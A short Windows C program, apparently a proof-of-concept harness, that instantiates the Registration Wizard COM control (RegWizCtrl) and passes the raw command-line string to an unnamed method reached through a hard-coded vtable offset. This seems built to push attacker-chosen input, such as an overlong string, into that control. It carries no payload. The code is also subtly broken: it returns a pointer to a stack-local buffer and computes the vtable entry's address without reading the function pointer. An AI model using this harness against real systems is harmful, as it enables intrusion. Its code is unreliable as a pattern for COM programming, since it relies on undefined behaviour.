#include <objbase.h>
CLSID CLSID_REGWIZCTRL={0x50E5E3D0,0xC07E,0x11D0,0xB9,0xFD,0x00,0xA0,0x24,0x9F,0x6B,0x00};
CLSID IID_IREGWIZCTRL={0x50E5E3CF,0xC07E,0x11D0,0xB9,0xFD,0x00,0xA0,0x24,0x9F,0x6B,0x00};
typedef void (WINAPI* UNKNOWN)(LPVOID,WCHAR*);

WCHAR* WINAPI ConvertToUnicode(LPCSTR lpMultiByteStr)
{
	WCHAR WideCharStr[256];
	MultiByteToWideChar(CP_ACP,0,lpMultiByteStr,-1,WideCharStr,256);
	return WideCharStr;
}

int WINAPI LoadAndUseRegWizCtrl(LPCSTR lpMultiByteStr)
{
	LPVOID ppv;

	if(CoCreateInstance(CLSID_REGWIZCTRL,NULL,CLSCTX_INPROC_SERVER | CLSCTX_REMOTE_SERVER,IID_IREGWIZCTRL,&ppv) >= 0)
	{
		UNKNOWN unknown=(UNKNOWN)(*(DWORD*)ppv+36);
		unknown(ppv,ConvertToUnicode(lpMultiByteStr));
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd)
{
	CoInitialize(NULL);
	LoadAndUseRegWizCtrl(lpCmdLine);
	CoUninitialize();
}
